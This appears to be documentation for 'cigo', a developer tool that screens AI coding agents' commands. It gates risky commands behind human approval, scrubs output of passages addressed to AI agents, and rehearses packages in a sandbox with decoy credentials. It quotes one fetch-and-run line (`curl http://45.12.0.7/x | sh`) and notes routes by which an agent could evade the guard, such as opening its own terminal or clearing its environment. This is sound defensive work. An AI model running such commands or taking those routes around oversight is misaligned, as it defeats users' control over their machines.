| critical | gate | refuse | refuse | refuse |
| high | ask | ask | ask | ask |
| medium | notice | notice | notice | notice |
| low | silent | silent | silent | silent |
| none | silent | silent | silent | silent |

Silent runs in the log; notice is one line, no question, and the work
carries on; ask waits for a person with a safe default (`E894`); refuse
stops it and says so in one line; gate takes OS authentication (the
blacklist two-warnings flow, `blacklist_unboxed = ask`). In an agent's
session there is no terminal to answer on, so a gate is refused there.
These defaults are what cigo did before the table, cell for cell. #66's
own table differs: it would ask or gate a critical finding it is less
sure of, and refuse a confident high or medium one. That changes what the
guard lets through, so it waits for your word (otmof-ops/cig-script#153). `cigo guard tier` prints the whole table, `cigo guard tier
<risk>` prints one row, and `cigo guard tier <risk> <confidence>` prints
one cell as a bare word: paths that decide whether to prompt read the
cell, rather than branching on the risk alone.

| verdict | what happens |
|---|---|
| none, low | it runs |
| medium | it runs, and the agent is told the finding after its output |
| high | nothing runs until a person approves it: `E894`, with the id to approve |
| critical | refused, and the agent is told not to look for a way around it |

```
E894 your agent's asking for the good stuff. a human has to say yes.
  claude-code wants to run: echo 'export X=1' >> ~/.bashrc   (high: writes a shell startup file, which runs again at every login)
  your user approves it on their own terminal with: cigo approve e2d3320fe7   (or says no). Nothing ran; ask them, then run the same command again.
```

**`cigo approve <id>`** shows the command and its findings, asks the
operating system for your password (`agent_approval = os-auth`: polkit on
Linux, the administrator prompt on macOS), and signs a one-time approval
with the tin's key. The agent's next run of that exact command, in that
folder, goes ahead, once. Asked from inside an agent's session (`CLAUDECODE`,
`CLAUDE_CODE_ENTRYPOINT` or `CIGO_AGENT` set), it is refused and logged:

```
E895 nice try. agents can't sign their own permission slip.
```

`agent_approval = tty` approves at a terminal of yours instead, which is
weaker: a determined agent can open a terminal of its own. `never` refuses
high like critical.

**Remembered answers.** A yes to an ask-tier question can be kept keyed
by the sha256 of the bytes the question was about (the command line, or
the file tool's path with its new text): the next ask for the same bytes
is skipped. Records live under `~/.cig-orchestrator/remembered/`, each
held by one of cig's passes over its bytes, so a task cannot write its
own permission slip; one byte of a difference is a different key, so a
changed command is asked again. A record that does not verify is said
(`E889`) and ignored. Approvals from `cigo approve` stay one-shot: the
remembered store is for scopes wider than one run.

What a command prints is scrubbed before it reaches the agent (#63 step 1):
invisible Unicode (`E887`) is stripped, a chat-template shape is left in
place but wrapped in `[cig: begin untrusted text (E886), id r-xxxxxxxx.o1]
... [cig: end untrusted text]`, a line addressed to AI agents is replaced
with `[cig: removed 1 passage addressed to AI agents (E886), id
r-xxxxxxxx.o2]`, and a line that is also reaching for your credentials, an
exfiltration host, a fetch-and-run or the guard's own state is withheld
whole (`[cig: content withheld on this line (...), id r-xxxxxxxx.e1]`). Each
marker names the run's id and its own place (`o` for stdout, `e` for
stderr, then a count). A one-line notice goes in front of the output
counting what was done, so the agent does not guess at missing text:
`[cig: scrubbed this output - 1 passage redacted, 212 invisible characters
removed (E886, E887). id r-xxxxxxxx. the rest is unchanged.]`. A plain `cigo
run`, `cigo audit` or any other command that is not `cigo agent run` is not
touched; the shim's pass-through (`cigo guard exec`) and `cigo update`'s
installer output still use the warning-first fence when they are read by
an agent (an agent variable is set), until later steps of #63 extend
scrubbing there.

**`cigo scrub show <id>`** prints what cigo removed from an agent's output
under that id: the agent, the session, the command, the counts and each
removed passage in order, with its mark. The record is sealed in the tin
under the label `cigo-scrub` (`cig tin keep`; `cig tin give --label
cigo-scrub --name <id>` is the same read) and is not left in the clear:
cigo hands it to `cig tin keep` through a private file and removes that
file as soon as the copy is kept. The box an agent's commands run in has no
key, so nothing there can open a record. From an agent's session outside a
box (`CLAUDECODE`, `CLAUDE_CODE_ENTRYPOINT` or `CIGO_AGENT` set) `cigo scrub
show` is refused as well, which stops an agent that asks, not one that
clears its environment. When the tin cannot keep a record (no key here, a
cig older than 1.14.0), the warning says so and `cigo scrub show` has
nothing to show for that id.

**Writing scrubbed text back.** A file tool (Write, Edit, MultiEdit,
NotebookEdit) whose text carries cigo's own scrub markers (the agent read a
scrubbed copy and is writing it back) has each marker swapped for the
passage it stood for, and each fence taken off, by the PreToolUse hook
before the write lands: in the new text, and in the text an edit looks
for, so the edit still finds its place. Each marker names its own passage,
so a write that carries some of them, in any order, gets each back where
it was; the agent's real edits are kept. A marker this machine has no
record for (a page about cigo, cigo's own tests, another machine's output)
is text like any other and is left as it is; cigo asks the tin only for
its own runs, so a page full of markers costs nothing. A marker from one
of this machine's runs with no passage to put back (the tin could not
keep the record, no longer holds it, or the mark names no passage) is
refused: nothing is written, so no file gets a marker where its own text
was.

```
cigo agent log [--agent=<name>] [--session=<id>] [--json]     what an agent ran, with verdicts and run ids
cigo agent undo --session=<id> | --agent=<name> | --since=2h  every run in the set, newest first; --yes does it
```

`cigo agent undo` takes each run back through `cig unburn`, newest first,
and stops at the first one cig refuses (you changed something since). "Undo
everything my AI did this afternoon" is `cigo agent undo --since=4h --yes`.

**Claude Code.** `cigo guard scope agents --agents=claude-code` shows the
entry it would add to `~/.claude/settings.json`, and `--yes` adds it,
keeping everything else in the file: a `PreToolUse` hook for the Bash tool
and the file tools that write without a shell (Write, Edit, MultiEdit,
NotebookEdit), `cigo agent hook claude-code`. The hook denies a critical
command and an unapproved high one, with the reason Claude reads. Any other
command is rewritten to run through `cigo agent run`, the rest of the call
kept as it was. A file tool is judged by the path it would write (`~`
expanded, links followed) and the text it would put there: the guard's own
files are denied (`E897`); a startup file, a git hook, an autostart entry, a
folder on `PATH`, or text rated high waits for a person (`E894`, then the
same change again); text rated critical is denied; a write in the project
goes ahead, and one elsewhere in your home goes ahead and is logged under
the agent's session. An entry from an older cigo is brought up to date in
place. cigo keeps its word on the hook in the tin as well: `cigo guard`,
`ciginstaller doctor --tools` and every guarded call check the entry is still there, and say
so when it was taken out or changed (`E897`); `cigo guard scope agents
--agents=claude-code --yes` puts it back. Claude Code then checks its own permission rules against the
rewritten command, so allow and deny rules written for plain commands
(`Bash(npm test)`) no longer match it: it asks you instead, unless the
session's mode allows the call. A settings file that is a symbolic link
(kept in a repository) is not rewritten; cigo prints the entry to add by
hand. `cigo guard uninstall` takes the entry out again.

A rehearsal that finds nothing is not called clean until cig's box can
report what the code read and which connections it tried (CigScript #106):
it says so (`E898`), rates low (it runs where low runs), and keeps nothing,
so the same bytes are rehearsed again. A script is read as well as
rehearsed, with the files it runs from its own folder (`node ./x.js`,
`python helper.py`, `sh ./y.sh`, `source ./z`), and the read joins the
pieces a JavaScript file builds at run time (char codes, `'a' + 'b'`, an
array of literals joined) before the rules see it. A rehearsal whose
install failed with nothing found could not judge: it says so, exits 1,
and keeps nothing. A fetch-and-run from a raw address (`curl
http://45.12.0.7/x | sh`, the decimal and hex forms too) is critical
wherever it is read: a task, a shim's package, `run-url`'s script, an
agent's command.

### The rehearsal: the dry run is the real run

On Linux with cig 1.12.0, a stage that runs code the project did not write
(an install and its hooks, a build that runs its dependencies' build
scripts), or that the read above flagged, runs once, for real, in cig's
contained box: everything it writes is a layer cig reads, the rest of the
machine is read-only to it, it opens no Unix socket, and its only way out is
the registries its toolchain's footprint names. Then cigo judges what it did
against that footprint:

- what it wrote within the footprint is applied as it is, journaled like any
  task, so there is no second run;
- what it did beyond it is the verdict's evidence, with the same friction:
  a write to a shell's startup file, a git hook or an autostart entry is
  `E873` (high), a changed credential file `E871`, a set-id file `E878`, a
  link into your home or a folder it hid `E880`, many removals `E877`, a
  rename sweep to one ransomware-tagged extension or a ransom-note-shaped
  file dropped across directories `E876` (critical), a host the box refused
  `E872` (high for a raw address);
- a rehearsal that stayed within its footprint approves the task as it is,
  so the next run pays one lookup.

```
rehearse = auto     (default) stages that run third-party code, and what the read flags
rehearse = always   every task not approved (the paranoid preset)
rehearse = never    read only (the chill preset)
```

Each toolchain's footprint (what its setup and build stages write, read,
fetch and run, from the tools' own documentation) is in the knowledge base;
`cigo toolchains <name>` prints it, and a task adds to it with `footprint`
in the manifest. A project pointing its tools at another registry
(`npm_config_registry`, `PIP_INDEX_URL`, `GOPROXY`, …) has that host joined
to the footprint at run time. Task runners (`make`, `just`, `scripts`, …)
run the project's own code and have no footprint of their own; a container
build happens in the container daemon, which the box cannot see.

**`cigo rehearse <package>`** checks a package before it touches anything:
it installs it and uses it once in a scratch project inside the box, applies
none of it, and says what it did beyond the ecosystem's footprint. Using it
once matters: much malware waits for the first `require` or `import`, and a
wheel runs no code at install at all. npm requires the package, PyPI imports
each of its top-level modules (from `top_level.txt`, or the `.py` files it
installed), and a crate is linked into a scratch program that runs, so what
runs before `main` runs in the box too. `--no-use` installs only, and its
verdict is kept apart from a used one. No project needed.

```
cigo rehearse npm:name[@version]       npm install, then require it once
cigo rehearse pypi:name[==version]     pip install in a scratch venv, then import it
cigo rehearse crates:name[@version]    a scratch program that links the crate, built and run
cigo rehearse ./install.sh             a script you were told to run
cigo rehearse ./pkg-1.0.0.tgz          a local npm tarball someone sent you, installed and required
cigo rehearse ./pkg-1.0.0.whl          a local wheel, pip installed and imported
cigo rehearse ./pkg-1.0.0.crate        a local .crate, extracted and built through cargo
cigo rehearse ./some-package/          a folder with package.json, pyproject.toml/setup.py or Cargo.toml
cigo rehearse git+https://host/repo    cloned into the scratch (never your tree), then rehearsed as a folder
cigo rehearse git+https://host/repo#v1 a clone at that ref, rehearsed the same way
cigo rehearse name[@version]           in the registry this project's toolchains use (two: it asks which)
              [--json] [--keep]        the full evidence; keep the layer to read (cig box list)
cigo rehearse                          in a project, with nothing named: the manifest's direct dependencies
cigo rehearse --changed [--base=<rev>] every package the lockfiles add or change since the base
              [--list] [--max=N]       name them and rehearse nothing; at most N (50)
              [--jobs=N]               rehearse up to N at once, each in its own box (rehearse_jobs)
              [--isolation=<level>]    auto, box, container, gvisor or vm (isolation); the report's first line names the one used
              [--sarif [<file>]]       for code scanning: on stdout, or written to the file named
              [--markdown]             for a pull request comment
              [--fresh]                rehearse even what was rehearsed before
              [--no-use]               install only: no require, import or run (rehearse_use = off)
              [--use]                  use it once, whatever rehearse_use says
              [--against=<v | ./old.sh>] only what is new against that version, or that script
              [--fail-on=<level>]      the lowest verdict that fails (auto: high under CI, critical at a terminal)
```

**Local inputs: a tarball, wheel, crate, folder or git+URL.** A `.tgz` or
`.tar.gz` is installed as a local npm package; a `.whl` as a local wheel; a
`.crate` is extracted and taken as a path dependency through cargo. A folder
is rehearsed by its manifest: `package.json` as npm, `pyproject.toml` or
`setup.py` as PyPI, `Cargo.toml` as crates.io. A `git+https://…` URL is
cloned into `.cigo-rehearse-clone/` in the scratch (never into your tree)
and rehearsed as a folder, and `git+https://…#ref` clones that ref. A
local file's verdict is kept against its sha256; a folder's against the
sha256 of its content (files sorted, hidden folders and common build
output left out); a clone's against the commit at HEAD. The same bytes
are never rehearsed twice.

**What changed in this version.** `cigo rehearse npm:ua-parser-js@0.7.29
--against=0.7.28` rehearses both (or uses their kept verdicts) and shows,
and rates, only what the first does that the second did not: a new write
outside the footprint, a new host it tried, a new finding. Most real
supply-chain attacks are a bad update to a good package, and this is the
question that catches them. A script takes another script
(`cigo rehearse ./install.sh --against=./install-old.sh`). The exit code is
the new behaviour's risk, by `--fail-on` as ever.

**Never the same bytes twice.** A verdict is kept under what was rehearsed:
an npm or crates.io package at an exact version (a registry never serves
other bytes under a published version), with the lockfile's hash when
`--changed` knows it; a PyPI package only with that hash, since a release
can gain files later; a script by its sha256; a local file by its sha256;
a folder by the sha256 of its content; a clone by the commit at HEAD.
Asked again about the same bytes, cigo answers from the kept verdict
without the box, and says when it was rehearsed. Kept verdicts are signed
with the tin's key, so nothing a task runs can plant a clean one, and a
new cigo version judges again. `--fresh` rehearses anyway.

**Setup shares kept verdicts.** When `cigo run setup` is rehearsed and
comes back clean, every package the project's lockfiles name is kept under
the same key `cigo rehearse` reads: npm and crates.io by version with the
lockfile's integrity, PyPI by version with its hash. The next
`cigo rehearse npm:name@1.2.3` answers from the kept verdict without the
box, and the next setup rehearsal skips a package whose bytes have been
judged clean already. The same key, both ways.

**`--changed`** is the pull request's question: which packages does this
change bring in? It compares the lockfiles with the base (`--base=<rev>`, or
the first of `origin/HEAD`, `origin/main`, `origin/master`, `main` and
`master` that exists), committed or not, new lockfiles included, and takes
every package that is new or at a new version. Each npm, PyPI and crates.io
package is rehearsed on its own and its findings are placed at its entry in
the lockfile; the rest are named as not rehearsed. `--list` stops at the
names, and `--max` (50) keeps a lockfile refresh from rehearsing for an hour.

**Nothing named, in a project.** `cigo rehearse` with no package, in a
folder with a `package.json`, `requirements.txt`, `pyproject.toml` (its
`[project]` dependencies) or `Cargo.toml`, rehearses the direct dependencies
those manifests name, and says so on its first line (`no package named, so
the manifest's direct dependencies in package.json, Cargo.toml: 12
packages`). A dependency a lockfile beside the manifest pins (npm's
`package-lock.json`, `Cargo.lock`, `poetry.lock`, `uv.lock`) is rehearsed at
the locked version and its verdict kept under the lockfile's hash, as
`--changed` does; one it does not pin is rehearsed as its range. A
dependency that is not a registry's (`file:`, a git URL, a `path`) or whose
range this does not pass to the tool is named as not rehearsed. `--list`,
`--max`, `--jobs`, `--json`, `--sarif`, `--markdown`, `--fresh` and
`--fail-on` work as they do for `--changed`. It is not `cigo run setup`,
which rehearses the setup stage as a whole.

**In parallel.** `--jobs=N` (or `rehearse_jobs`, `auto` by default: half the
cores, at most 8) rehearses up to N packages at once for `--changed` and for
a bare `cigo rehearse`. Each runs as a child cigo with a scratch folder and a
box of its own, so one package cannot see another's, and the answers print in
the order the packages were listed, whichever finished first. It needs cigo
started through its launcher (`cigo`, not `cig run orchestrate.cig`); without
it they run one after another and the report says so. `--jobs=1` is the old
behavior.

**Blamed on the package that did it.** After the install and the use, the
rehearsal reads the tree it made (npm's `node_modules`, the venv's
distributions, `cargo tree`) and blames a finding on the path from the
package you asked for: `via colors-plus -> ansi-glow@0.3.2`. A dependency
on your blacklist, or one named a letter or two from a popular package, is
blamed exactly. What the box saw written or reached does not say which
package did it, so it is blamed on the dependencies that carry an install
script, and when there are several the finding names each and says the box
cannot tell which. The report's first line says how many dependencies were
read (`rehearsed colors-plus@2.4.1 in 6.2 s, with its 12 dependencies`).

**Where it runs: the isolation levels.** A rehearsal never runs without
isolation: running unknown code unprotected to find out whether it is safe
defeats the point. `isolation` (or `--isolation=<level>` for one run) is
`auto` by default, which takes the strongest level this machine has that
works; the report's first line names the one used (`rehearsed colors-plus@2.4.1
in 6.2 s, with its 12 dependencies (isolation: box)`), and `cigo doctor`
lists each level and the one `auto` would use.

| level | what | needs |
|---|---|---|
| `box` | cig's contained box: user, mount, network and PID namespaces, the registry as the only network, what the install wrote outside its footprint and which addresses it tried to reach seen | Linux, cig 1.12.0 or later, unprivileged user namespaces |
| `gvisor` | the same rehearsal, inside the box, run under gVisor (`runsc --rootless do`), so the package gets a kernel of its own | `runsc` that runs a command rootless here; **not tested against a real gVisor yet** |
| `container` | a throwaway Docker or Podman container: nothing of your machine mounted (a script's own folder read-only), no capabilities, no new privileges, a read-only root, bounded memory and processes. The fetch has a network and runs no package code (npm `--ignore-scripts`, `pip download`, `cargo fetch`); the run that executes the install scripts, the build and the use has none | Docker or Podman that answers; the way to rehearse on macOS and Windows, where they run a Linux VM |
| `vm` | a Firecracker or QEMU microVM | not built: refuses, and says so |

`auto` prefers `gvisor`, then `box`, then `container`: on Linux the box is the
level that sees what a package tried to reach and wrote, and a container is
picked over it only where there is no box (macOS, Windows, a runner without user
namespaces). With none of them it refuses: `rehearsing without isolation would
run the package on your machine; install Docker or Podman, or rehearse on
Linux`, and what each level said. A level you name that cannot be had is refused
with its reason, never swapped for another. The container takes a package from
its registry, or a script; a local file, a folder or a `git+` URL needs
`--isolation=box`. Its honest limits: in the run phase there is no network, so
an attempt to reach out fails where it stands and is not named; a PyPI source
distribution whose build needs a backend from the network fails offline, and
the rehearsal says it could not judge. A verdict is kept under the bytes it
judged, whatever level judged them.

**Decoys.** Before the install, the rehearsal plants a decoy home: an SSH key,
cloud and registry tokens and a git credentials file, each holding a marker made
fresh from `/dev/urandom` for this rehearsal, and runs the install with `HOME`
there, so what looks in `~` finds the decoys (the tool's own places, cargo's,
rustup's and the XDG folders, stay the real ones, so version managers still
work). Afterwards it says what became of them. A decoy **read** (its access time
moved: each is set to the year 2000 first, and a probe proves the filesystem
records reads, else the report says it cannot watch) is `E871`, high; with an
attempt to reach a raw address (`E872`) it is critical. A **copy** of a marker
in another file of the scratch folders, or in what the install printed, is
named too. All of it is blamed on the package that did it, as above. The
marker never leaves the machine and is never printed. Limits: it sees a lookup
through `HOME`, not a read by an absolute path or by the account database; a
`./script.sh` keeps its own `HOME` (so what it writes there is judged against
its footprint); and until cig's own box plants decoys and watches reads
(CigScript#106), a read of anything else is not seen, which the E898 note says.

**`--sarif <file>`** writes the SARIF log to the file (relative to where cigo
was run) and says so on stderr, so a CI step needs no redirect:
`cigo rehearse --changed --base origin/main --sarif rehearse.sarif`.

**Settings for it.** `verdict_cache` is `on` by default; `off` neither reads
nor keeps a verdict, so the same bytes are rehearsed every time (a project
may only turn it off, never back on; `--fresh` does it for one run).
`rehearse_use` is `on` by default; `off` is `--no-use` for every run (a
project may only turn it on, never off; `--use` turns it back on for one
run). `rehearse_jobs` is the number above. `isolation` is the level above (`auto` by default; any value may be set by a project). `metadata_young_days` (7, see
registry metadata above) is how recent "recently published" is for `E882`.

It exits by risk, once the verdict reaches `--fail-on`: `0` below it (and
for none or low), `1` medium, `2` high, `3` critical. `--fail-on` is `low`,
`medium`, `high`, `critical`, `auto` or `never`; the setting is
`rehearse_fail_on`, `auto` by default, which is `high` under CI and
`critical` at a terminal, so a person reading the verdict is not also failed
by it. A project may raise it, never lower it. Off
Linux, with an older cig, or where cig cannot make a contained box (root,
user namespaces turned off, a kernel before 5.12), it says so and does
nothing; `cigo run` then reads its stages instead of rehearsing them, and
says so once.

### Running on the pinned version

When a toolchain's installed version disagrees with the project's pin, cigo
can run the task on the pinned one through a version manager already on the
machine, per task and never by changing anyone's default (no `mise use`, no
`rustup default`, no shell profile edited). The first manager found wins:

| manager | how the task runs | covers |
|---|---|---|
| **mise** | `mise exec <tool>@<version> -- <command>` | whatever `mise.toml` names: node, python, ruby, go, java, bun, deno, rust, zig... |
| **asdf** | `ASDF_<TOOL>_VERSION=<version>` in the task's environment (the shims read it) | whatever `.tool-versions` names |
| **rustup** | `RUSTUP_TOOLCHAIN=<version>` (the proxies read it) | rust |
| **uv** | `UV_PYTHON=<version>` | python |
| **pyenv** | `PYENV_VERSION=<version>` | python |
| **fnm** | `fnm exec --using <version> -- <command>` | node |
| **volta** | `volta run --node <version> <command>` (volta fetches a version it lacks itself) | node |
| **rbenv** | `RBENV_VERSION=<version>` | ruby |
| **go** | `GOTOOLCHAIN=go<version>` (Go fetches the toolchain itself the first time) | go |

What happens on a disagreement is the `versions` setting: `--versions=` on
the command, the manifest's `"versions"`, `cigo config versions`, in that
order; with nothing set it is `ask`, or `never` when `CI` is set.

| value | on a disagreement |
|---|---|
| `ask` | prints the question with the two commands that answer it (`cigo versions switch`, `cigo versions keep`), since a script cannot wait at a prompt, and runs on the installed versions meanwhile; asked once per set of pins, and again when a pin changes |
| `always` | switches without asking and says so in one line: `switching: node 22.11.0 (web/.nvmrc) via mise` |
| `never` | warns only (what 0.4.0 did) |
| `off` | does not look (the same as `CIGO_VERSIONS=0`) |

A version the manager lacks is a separate question, because it downloads:
`install` (`cigo config install`, or `--install=`) is `ask` (print the
command; `cigo versions install --yes` runs them all), `always` or `never`.
Each switched task's run line ends `on node 22.11.0 via mise (web/.nvmrc)`,
the run's record in `.cig-orchestrator/reports/` carries the same, and
`--strict` passes when the switch made the versions agree. A project with no
manager hears which one to install (`mise`, or the one language's own) and
carries on as today.

## Crash reports

A task failing is cigo doing its job. cigo itself failing, a runtime or type
error inside `orchestrate.cig`, is a bug in cigo, and it is reported the way
cig reports its own: a report is saved under `~/.cig-orchestrator/crashes/`,
the run is rolled back as any failed run is, and the report is handed to
cig's ashtray (`cig crash submit --origin cig-orchestrator`). From there it
is cig's: cig's `reports` setting (`cig config reports ask|always|never`;
ask once and remember, never under CI with nothing set) says whether it
goes; cig redacts it again, files one issue per bug on cigo's `issues_repo`
with a live stats block, waits out a lost network, and tells you on `cig
update --check` when a release fixed it. cigo's own `crash_reports` keeps
one word: `never` keeps the report on this machine and never hands it over;
`always` asks cig to send it in this process. Saving and handing over stay
cigo's own, so a crash is queued whether or not ciginstaller is installed;
reading, sending and deleting what is queued is `ciginstaller crash list|show|
send|delete` (`cigo crash` runs it). The ashtray gives the report its own id,
so `ciginstaller crash list` is where to find it; cigo's copy stays under
`~/.cig-orchestrator/crashes/` and its path is in what cigo printed. To report
something yourself: `ciginstaller bug cigo`.

The report holds cigo's and cig's versions, OS and architecture, the command
line (token-, secret-, URL- and path-looking values redacted), the project
directory relative to your home, a timestamp, the error and its line in
`orchestrate.cig`, and the id of the run. It does not hold your manifest,
environment variable values, or file contents.

## cig's own flags

Flags for the `cig` runtime go before the command, and the launcher passes
them through:

| flag | effect |
|---|---|
| `--dry-run` | plan every task, execute none; values from earlier tasks show as `{{...}}` |
| `--no-rollback` | when a task fails, keep what the finished tasks made (the way make does) |
| `--no-check` | skip cig's static check of the tool before it runs |
| `--max-steps N` | cig's step budget |
| `--plain` | the same messages without the catchphrases |
| `--json` | machine-readable output where cig supports it |
| `--no-color`, `--no-doctor` | no color codes; no automatic diagnosis under errors |

```sh
cigo --dry-run run release
cigo --no-rollback run build
```

After a run, cig's own commands take over: `cig runs` lists runs, `cig runs
<id>` shows one with its journal, and `cig unburn <id>` undoes one, including
every task's `undo`.

## Exit codes

| code | when |
|---|---|
| 0 | the run succeeded; check found no errors; doctor found every tool |
| 1 | a task failed and the run was put back; check found errors; doctor found a tool missing |
| 2 | the command can't start: an unknown command, task or flag, a manifest that doesn't parse, a task that can't run as written |

A guarded call (a level 2 shim's), `cigo run-url` and `cigo agent run` exit
with the program's own code when it ran, and otherwise with the guard's: 1 held at
medium, 2 held at high, 3 refused as critical.

## What cigo keeps

Everything goes in `.cig-orchestrator/` at the project root; add it to
`.gitignore`.

| path | holds |
|---|---|
| `logs/<task>.log` | every attempt of a task: the command, its full output, its exit code and time |
| `reports/<time>.json` | one per successful run: the order, each task's result and time, and what was handed on |
| `run/outputs.json` | what the last run's tasks handed on (`cigo outputs` reads it) |
| `run/<task>.out` | the `$CIG_OUTPUT` file a task wrote |
| `state/<task>.json` | a task's inputs fingerprint and values, for skipping it when up to date |
| `state/versions.json` | the version each tool answered (with its program's path, size and time), and the answer to the versions question, per set of pins |

cig keeps its own run records (the journal, the snapshots, and the tin that
holds the before-bytes of what a task's `touches` named) under
`~/.cigscript/`. cigo keeps its own, outside any project, under
`~/.cig-orchestrator/` (`CIGO_HOME`):

| path | holds |
|---|---|
| `config` | your settings (`cigo config`) |
| `osv/` | OSV's answers and the advisories read (online), and one database per ecosystem (`cigo audit --update-db`) |
| `blacklist/` | the last signed copy of each blacklist, which still counts when the list itself is changed by hand |
| `rehearsals/` | the kept verdicts, each signed, by what was rehearsed (`cigo rehearse --fresh` ignores them) |
| `crashes/<id>.json` | cigo's copy of each crash report, yours until you send the ashtray's (`ciginstaller crash`) |
| `shims/` | the level 2 shims (`cigo guard scope dev --yes`; `cigo guard uninstall` removes them) |
| `guard/` | the guard's level and what it installed (`state.json`), its log (`log.jsonl`), a pause or off switch, the Enter-key hooks (`hook.bash`, `hook.zsh`), and the first copy of each startup file it gave a block (`before/`) |
| `quarantine/` | what `cigo run-url` downloaded, by its sha256 |
| `here/` | the empty folder cigo runs from when it is called from your home folder itself |
| `agent/` | agent commands waiting for a person (`pending/`) and the one-time approvals, each held by a pass (`approved/`); using one revokes its pass |
| `trust/` | the approvals: a record per approval's pass (`passes/`), and approvals from before passes, put aside once moved onto one (`retired/`) |
| `allowed/`, `remembered/` | allowances and remembered answers, each held by a pass over its bytes (`<record>.json.pass` names it) |

## Environment

| variable | effect |
|---|---|
| `NO_COLOR` | no color codes |
| `CIG_PLAIN=1` | the same as `--plain` |
| `CIG_DOCTOR=0` | the same as `--no-doctor` |
| `CIGSCRIPT_HOME` | where cig keeps run records, instead of `~/.cigscript` |
| `CIGO_HOME` | where cigo keeps its config and crash reports, instead of `~/.cig-orchestrator` |
| `CIGO_FLOOR_CACHE=off` | the launcher's `cig --version` floor cache in `$CIGO_HOME/cig-floor` is not read or written for this call (the suite sets it so one test's writes never land on another's home) |
| `CIGO_VERSIONS=0` | no version warnings |
| `CIGO_BOX=0`, `CIGO_BOX=1` | tasks on the tin, or in the box, where the manifest and the task say nothing (the default is the box on Linux and the tin elsewhere) |
| `CIGO_BLACKLIST_DIR` | where your blacklists live, instead of `~/.config/cigscript/blacklist.d` (the suite uses it) |
| `CIGO_OSV_API`, `CIGO_OSV_DUMPS` | another OSV to ask (`https://api.osv.dev`) and another place for its dumps (`https://osv-vulnerabilities.storage.googleapis.com`): a mirror, or a fixture (the suite uses them) |
| `CIGO_ACCEPT_RISK=1` | a guarded call held at medium or high runs this once, at a terminal |
| `CIGO_RUN_UNTRUSTED=1` | a guarded call refused as critical runs this once, at a terminal |
| `CIGO_GUARDED` | set inside a guarded call: a package manager run again from it is the real one |
| `CIGO_GUARD_HOOK=0` | the Enter-key hook lets every line through in that shell |
| `CIGO_CALLER_DIR` | set by the launchers when they move to `here/`: the folder cigo was called from |
| `CIGO_AGENT`, `CIGO_AGENT_SESSION` | the agent and session `cigo agent run` tags its run with (`--agent`, `--session` win); set for the command it runs, and `cigo approve` refuses under it |
| `CIGO_LAUNCHER` | the `cigo` the shims call (the launcher sets it; the suite points it at a stub) |
| `CIGO_INTERNAL_PANIC=<command>` | crash on purpose at that command (`mid-run` for inside a run), for the suite |

## On Windows

`bin/cigo.cmd` is what `cigo` resolves to, at a cmd prompt and a PowerShell
one alike; it runs `bin/cigo.launch.ps1` beside it (through `pwsh` when it
is installed, else Windows PowerShell, with the execution policy bypassed),
which splits cig's flags, walks up to the manifest and checks the cig it
hands the tool to, the same as the `sh` launcher. The launcher is not named
`cigo.ps1` on purpose: PowerShell would run that in-process before the shim
and eat the task's `--`. ciginstaller lays both down with the tool and puts their folder on the
user PATH. Under Git Bash and
MSYS2 the `sh` launcher works too, and keeps a task's arguments as typed
(`MSYS2_ARG_CONV_EXCL`). The checkout carries a `.gitattributes`, so scripts
are LF and the Windows files CRLF whatever `core.autocrlf` says.

## Without the launcher

`cigo` is a small `sh` script. The tool itself is one CigScript file, so this
works anywhere cig does:

```sh
cig run path/to/orchestrate.cig -- run ci
cig run --dry-run path/to/orchestrate.cig -- run release
```
